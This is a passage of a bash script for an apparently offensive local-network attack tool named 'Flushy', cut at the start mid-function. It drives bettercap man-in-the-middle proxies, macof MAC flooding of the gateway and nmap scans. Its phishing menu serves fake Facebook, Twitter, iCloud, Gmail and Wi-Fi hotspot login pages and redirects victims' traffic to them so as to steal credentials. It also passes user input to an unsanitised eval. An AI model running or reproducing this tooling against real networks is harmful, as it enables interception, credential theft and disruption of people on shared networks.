else
	if echo $target | grep -qoE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'; then
sudo bettercap -I $interface --proxy-module $script_dir/Ressources/modules/title.rb -T $target
echo
else sudo bettercap -I $interface --proxy-module $script_dir/Ressources/modules/title.rb
echo
fi
fi
;;
help) echo;echo $'\033[0;32mrun\e[0m -  execute command'
echo $'\033[0;32mback\e[0m - return to Menu'
echo $'\033[0;32mexit\e[0m - exit';echo
;;
back) attack_menu
;;
exit) exit 1
;;
*) echo
echo -e "$(print_error 'Invalid command. Type "Help" to see all commands')"
echo
;;
esac
done
;;
macof)
echo
echo $'\033[0;32mmacof\e[0m - Flood network with random mac adresses'
echo
until [ "$CHOICE" = "exit" ]
do
read -p $'\033[0;31mType run to execute "macof" command\e[0m : ' CHOICE
case $CHOICE in
run)
echo
read -p "Number of mac adresses (default: infinite) : " mac
mac=${mac:-""}
if [ -z $mac ]; then
if [[ "$OSTYPE" == "darwin"* ]]; then
cd $script_dir/Ressources/dsniff
echo
echo -e "$(print_status "Flooding network ...")"
./macof -i $interface -d $gateway > /dev/null 2>&1
cd $script_dir
echo
else 
echo
echo -e "$(print_status "Flooding network ...")"
macof -d $gateway > /dev/null 2>&1
echo
fi 
else 
if [[ "$OSTYPE" == "darwin"* ]]; then
cd $script_dir/Ressources/dsniff
echo
echo -e "$(print_status "Flooding network ...")"
./macof -i $interface -d $gateway -n $mac > /dev/null 2>&1
echo
cd $script_dir
else 
echo
echo -e "$(print_status "Flooding network ...")"
macof -d $gateway -n $mac > /dev/null 2>&1
echo
fi
fi
;;
help) echo;echo $'\033[0;32mrun\e[0m -  execute command'
echo $'\033[0;32mback\e[0m - return to Menu'
echo $'\033[0;32mexit\e[0m - exit';echo
;;
back) attack_menu
;;
exit) exit 1
;;
*) echo
echo -e "$(print_error 'Invalid command. Type "Help" to see all commands')"
echo
;;
esac
done
;;
clear) attack_menu
;;
ports) echo
until [ "$CHOICE" = "exit" ]
do
read -p $'\033[0;31mType run to execute "ports" commands\e[0m : ' CHOICE
case $CHOICE in
run)  echo; echo "Sacnning ports ..."
if [[ "$target" == "all" ]]; 
  then sudo nmap $gateway/24
elif [[ $(echo $target | sed 's/,/ /g' | wc -w | sed 's, ,,g') == "1" ]]; then
  sudo nmap $target
else
result=$(for i in $(echo $target | sed 's/,/ /g'); do echo ${i##*.}; done | tr '\n' ',' | sed 's/,[^,]*$//')
sudo nmap $(echo $gateway | sed 's/\.[^.]*$/./')$result
fi
;;
help) echo;echo $'\033[0;32mrun\e[0m -  execute command'
echo $'\033[0;32mback\e[0m - return to Menu'
echo $'\033[0;32mexit\e[0m - exit';echo
;;
back) attack_menu
;;
exit) exit 1
;;
*) echo
echo -e "$(print_error 'Invalid command. Type "Help" to see all commands')"
echo
;;
esac
done
;;
phishing)
echo
echo $'\033[0;32mphishing\e[0m - Steal credentials with phishing pages'
echo
until [ "$CHOICE" = "exit" ]
do
read -p $'\033[0;31mType help to see "phishing" commands\e[0m : ' CHOICE
case $CHOICE in
facebook)
echo
echo -e "$(print_good "Running webserver at: hhtp://$local:8000")"
echo
cd $script_dir/Server/facebook
sudo nohup python -m SimpleHTTPServer 80 > /dev/null 2>&1 &
sudo nohup php -S $local:80 > /dev/null 2>&1 &
read -p "Run HTTPS Proxy ? Y/n " https
https=${https:-y}
echo
if [[ "$https" =~ ^[Yy]$ ]]
then
if echo $target | grep -qoE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'; then
sudo bettercap -I $interface --proxy-https --proxy --proxy-module redirect --redirect-url http://$local:8000 -T $target
echo
else
sudo bettercap -I $interface --proxy-https --proxy --proxy-module redirect --redirect-url http://$local:8000
echo
fi
else
  if echo $target | grep -qoE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'; then
sudo bettercap -I $interface --proxy --proxy-module redirect --redirect-url http://$local:8000 -T $target
echo
else
sudo bettercap -I $interface --proxy --proxy-module redirect --redirect-url http://$local:8000
echo
fi
fi
killall php > /dev/null 2>&1
killall python > /dev/null 2>&1
;;
facebook2)
echo
echo -e "$(print_good "Running webserver at: hhtp://$local:8000")"
echo
cd $script_dir/Server/facebook2
sudo nohup python -m SimpleHTTPServer 80 > /dev/null 2>&1 &
sudo nohup php -S $local:80 > /dev/null 2>&1 &
read -p "Run HTTPS Proxy ? Y/n " https
https=${https:-y}
echo
if [[ "$https" =~ ^[Yy]$ ]]
then
if echo $target | grep -qoE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'; then
sudo bettercap -I $interface --proxy-https --proxy --proxy-module redirect --redirect-url http://$local:8000 -T $target
echo
else
sudo bettercap -I $interface --proxy-https --proxy --proxy-module redirect --redirect-url http://$local:8000
echo
fi
else
  if echo $target | grep -qoE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'; then
sudo bettercap -I $interface --proxy --proxy-module redirect --redirect-url http://$local:8000 -T $target
echo
else
sudo bettercap -I $interface --proxy --proxy-module redirect --redirect-url http://$local:8000
echo
fi
fi
killall php > /dev/null 2>&1
killall python > /dev/null 2>&1
;;
twitter)
echo
echo -e "$(print_good "Running webserver at: hhtp://$local:8000")"
echo
cd $script_dir/Server/twitter
sudo nohup python -m SimpleHTTPServer 80 > /dev/null 2>&1 &
sudo nohup php -S $local:80 > /dev/null 2>&1 &
read -p "Run HTTPS Proxy ? Y/n " https
https=${https:-y}
echo
if [[ "$https" =~ ^[Yy]$ ]]
then
if echo $target | grep -qoE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'; then
sudo bettercap -I $interface --proxy-https --proxy --proxy-module redirect --redirect-url http://$local:8000 -T $target
echo
else
sudo bettercap -I $interface --proxy-https --proxy --proxy-module redirect --redirect-url http://$local:8000
echo
fi
else
  if echo $target | grep -qoE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'; then
sudo bettercap -I $interface --proxy --proxy-module redirect --redirect-url http://$local:8000 -T $target
echo
else
sudo bettercap -I $interface --proxy --proxy-module redirect --redirect-url http://$local:8000
echo
fi
fi
killall php > /dev/null 2>&1
killall python > /dev/null 2>&1
;;
icloud)
echo
echo -e "$(print_good "Running webserver at: hhtp://$local:8000")"
echo
cd $script_dir/Server/icloud
sudo nohup python -m SimpleHTTPServer 80 > /dev/null 2>&1 &
sudo nohup php -S $local:80 > /dev/null 2>&1 &
read -p "Run HTTPS Proxy ? Y/n " https
https=${https:-y}
echo
if [[ "$https" =~ ^[Yy]$ ]]
then
if echo $target | grep -qoE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'; then
sudo bettercap -I $interface --proxy-https --proxy --proxy-module redirect --redirect-url http://$local:8000 -T $target
echo
else
sudo bettercap -I $interface --proxy-https --proxy --proxy-module redirect --redirect-url http://$local:8000
echo
fi
else
  if echo $target | grep -qoE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'; then
sudo bettercap -I $interface --proxy --proxy-module redirect --redirect-url http://$local:8000 -T $target
echo
else
sudo bettercap -I $interface --proxy --proxy-module redirect --redirect-url http://$local:8000
echo
fi
fi
killall php > /dev/null 2>&1
killall python > /dev/null 2>&1
;;
orange)
echo
echo -e "$(print_good "Running webserver at: hhtp://$local:8000")"
echo
cd $script_dir/Server/orange_hotspot
sudo nohup python -m SimpleHTTPServer 80 > /dev/null 2>&1 &
sudo nohup php -S $local:80 > /dev/null 2>&1 &
read -p "Run HTTPS Proxy ? Y/n " https
https=${https:-y}
echo
if [[ "$https" =~ ^[Yy]$ ]]
then
if echo $target | grep -qoE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'; then
sudo bettercap -I $interface --proxy-https --proxy --proxy-module redirect --redirect-url http://$local:8000 -T $target
echo
else
sudo bettercap -I $interface --proxy-https --proxy --proxy-module redirect --redirect-url http://$local:8000
echo
fi
else
  if echo $target | grep -qoE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'; then
sudo bettercap -I $interface --proxy --proxy-module redirect --redirect-url http://$local:8000 -T $target
echo
else
sudo bettercap -I $interface --proxy --proxy-module redirect --redirect-url http://$local:8000
echo
fi
fi
killall php > /dev/null 2>&1
killall python > /dev/null 2>&1
;;
free)
echo
echo -e "$(print_good "Running webserver at: hhtp://$local:8000")"
echo
cd $script_dir/Server/free_hotspot
sudo nohup python -m SimpleHTTPServer 80 > /dev/null 2>&1 &
sudo nohup php -S $local:80 > /dev/null 2>&1 &
read -p "Run HTTPS Proxy ? Y/n " https
https=${https:-y}
echo
if [[ "$https" =~ ^[Yy]$ ]]
then
if echo $target | grep -qoE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'; then
sudo bettercap -I $interface --proxy-https --proxy --proxy-module redirect --redirect-url http://$local:8000 -T $target
echo
else
sudo bettercap -I $interface --proxy-https --proxy --proxy-module redirect --redirect-url http://$local:8000
echo
fi
else
  if echo $target | grep -qoE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'; then
sudo bettercap -I $interface --proxy --proxy-module redirect --redirect-url http://$local:8000 -T $target
echo
else
sudo bettercap -I $interface --proxy --proxy-module redirect --redirect-url http://$local:8000
echo
fi
fi
killall php > /dev/null 2>&1
killall python > /dev/null 2>&1
;;
gmail)
echo
echo -e "$(print_good "Running webserver at: hhtp://$local:8000")"
echo
cd $script_dir/Server/gmail
sudo nohup python -m SimpleHTTPServer 80 > /dev/null 2>&1 &
sudo nohup php -S $local:80 > /dev/null 2>&1 &
read -p "Run HTTPS Proxy ? Y/n " https
https=${https:-y}
echo
if [[ "$https" =~ ^[Yy]$ ]]
then
if echo $target | grep -qoE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'; then
sudo bettercap -I $interface --proxy-https --proxy --proxy-module redirect --redirect-url http://$local:8000 -T $target
echo
else
sudo bettercap -I $interface --proxy-https --proxy --proxy-module redirect --redirect-url http://$local:8000
echo
fi
else
  if echo $target | grep -qoE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'; then
sudo bettercap -I $interface --proxy --proxy-module redirect --redirect-url http://$local:8000 -T $target
echo
else
sudo bettercap -I $interface --proxy --proxy-module redirect --redirect-url http://$local:8000
echo
fi
fi
killall php > /dev/null 2>&1
killall python > /dev/null 2>&1
;;
hotspot)
echo
echo -e "$(print_good "Running webserver at: hhtp://$local:8000")"
echo
cd $script_dir/server
sudo nohup python -m SimpleHTTPServer 80 > /dev/null 2>&1 &
sudo nohup php -S $local:80 > /dev/null 2>&1 &
read -p "Run HTTPS Proxy ? Y/n " https
https=${https:-y}
echo
if [[ "$https" =~ ^[Yy]$ ]]
then
if echo $target | grep -qoE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'; then
sudo bettercap -I $interface --proxy-https --proxy --proxy-module redirect --redirect-url http://$local:8000 -T $target
echo
else
sudo bettercap -I $interface --proxy-https --proxy --proxy-module redirect --redirect-url http://$local:8000
echo
fi
else
  if echo $target | grep -qoE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'; then
sudo bettercap -I $interface --proxy --proxy-module redirect --redirect-url http://$local:8000 -T $target
echo
else
sudo bettercap -I $interface --proxy --proxy-module redirect --redirect-url http://$local:8000
echo
fi
fi
killall php > /dev/null 2>&1
killall python > /dev/null 2>&1
;;
help) echo
echo $'\033[0;32mhotspot\e[0m -  Fake wifi hotspot (Gmail/Twitter/Facebook)'
echo $'\033[0;32mfacebook\e[0m -  Redirect Facebook to phishing page'
echo $'\033[0;32mfacebook2\e[0m -  Redirect Facebook to phishing page'
echo $'\033[0;32mtwitter\e[0m -  Redirect Twitter to phishing page'
echo $'\033[0;32micloud\e[0m -  Redirect iCloud to phishing page'
echo $'\033[0;32mgmail\e[0m -  Redirect Gmail to phishing page'
echo $'\033[0;32morange\e[0m -  Fake Orange-Wifi login page'
echo $'\033[0;32mfree\e[0m -  Fake Free-Wifi login page'
echo $'\033[0;32mexit\e[0m - Return to Menu'
echo
;;
back) attack_menu
;;
exit) exit 1
;;
*) echo
echo -e "$(print_error 'Invalid command. Type "Help" to see all commands')"
echo
;;
esac
done
;;
*) if [[ $(echo $CHOICE | awk '{print $1;}') == "set" ]]; then
set=1
attack_menu
elif [[ $(echo $CHOICE | awk '{print $1;}') == "background" ]]; then
if [ -z $(echo $CHOICE | awk '{print $2;}') ]; then
echo
echo -e "$(print_error 'Please choose a module (e.g. "background injectjs")')"
echo
else
echo "Running background job for command : $(echo $CHOICE | awk '{print $2;}')"
echo
fi
else
last=$(print_error 'Invalid command. Type "Help" to see all commands' )
attack_menu
fi
esac
}






function main_menu
{
clear
bash $script_dir/banner.sh
echo "+--------------+-------------------+-------------+"
echo '|   IP Adress  |    Mac Adress     |   Gateway   |'
echo '+--------------+-------------------+-------------+'
if [[ $os == "osx" ]]; then
echo "| $(ipconfig getifaddr $interface) |"" $(ifconfig $interface | grep ether | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}') |"" $(route -n get default | grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' ) |"
else echo "| $(ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1') |"" $(cat /sys/class/net/$(ip route show default | awk '/default/ {print $5}')/address) |"" $gateway |"
fi
echo "+--------------+-------------------+-------------+"
echo
if [[ $last == "help" ]]; then
echo "Main Commands"
echo "============="
echo
echo "    Command       Description"
echo "    -------       -----------"
echo '    scan          Scan connected devices'
echo '    ports         Scan ports on all devices'
echo '    192.168.1.1   Prompt attack menu for selected IP adress without Scan'
echo '    IP1,IP2,IP3   Prompt attack menu for selected IP adresses without Scan'
echo '    all           Prompt attack menu for all devices without Scan'
echo '    clear         Clear '
echo '    help          Display this help menu'
echo '    exit          Exit Flushy'
echo 
last=""
fi
if [ ! -z "$last" ]; then
echo -e "$last"
last=""
echo
fi
if [ ! -z "$set" ]; then
if [ -z $(echo $CHOICE | awk '{print $2;}') ]; then
echo -e "$(print_error 'Please choose a variable: set (interface/spoofer/target) variable')"
set=""
echo
else
eval $(echo $CHOICE | awk '{print $2;}')=$(echo $CHOICE | awk '{print $3;}')
echo "$(echo $CHOICE | awk '{print $2;}') -> $(echo $CHOICE | awk '{print $3;}')"
if [ $(echo $CHOICE | awk '{print $2;}') = "target" ]; then
if [ -z "$(echo $CHOICE | awk '{print $3;}')" ]
  then target=all
  set=""
  attack_menu
else
target=$(echo $CHOICE | awk '{print $3;}')
set=""
attack_menu
fi
fi
set=""
echo
fi
fi
read -p $'\033[0;34m\e[4mFLUSHY\e[0m > ' CHOICE
 [[ $CHOICE = "0" ]]
 case $CHOICE in
help) last="help"
main_menu
;;
ports) echo;echo "Scanning ports ..."
echo
if [[ $os == "osx" ]]; then
sudo nmap $gateway/24 
else
sudo nmap $gateway/24 
fi
;;
scan) echo;echo "Scanning devices ..."
echo
if [[ $os == "osx" ]]; then
sudo nmap -sP -n $(route -n get default | grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' )/24 > $script_dir/Logs/scan.txt
else
sudo nmap -sP -n $gateway/24 > $script_dir/Logs/scan.txt
fi
cat $script_dir/Logs/scan.txt | grep -oE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}|([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2} [^ ]*' | while read line; do if echo "$line" | grep -qoE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'; then printf "$line  "; else echo "-  $line" ;fi;done && printf '%s\n' "-  $(ifconfig $interface | grep ether | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}') (You)"
echo
echo
read -p "Enter an IP or multiple separated by comas (or all) : " CHOICE
case $CHOICE in
exit) exit 1
 ;;
all) target="all"
attack_menu
;;
*) target=$(echo $CHOICE)
attack_menu
	until [ ! -z "$CHOICE" ]; do
	echo "Error: Choose a device"
	read -p "Choose a device number (or all): " CHOICE
done
;;
exit) exit 1
esac
;;
exit) exit 1
;;
back) exit 1
;;
clear) main_menu
;;
*) if [[ $(echo $CHOICE | awk '{print $1;}') == "set" ]]; then
set=1
main_menu
elif echo $CHOICE | grep -qoE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'; then
target=$(echo $CHOICE)
attack_menu
elif [ "$CHOICE" = "all" ]; then
target="all"
attack_menu
else
last=$(print_error 'Invalid command. Type "Help" to see all commands' )
main_menu
fi
;;
esac
}

main_menu
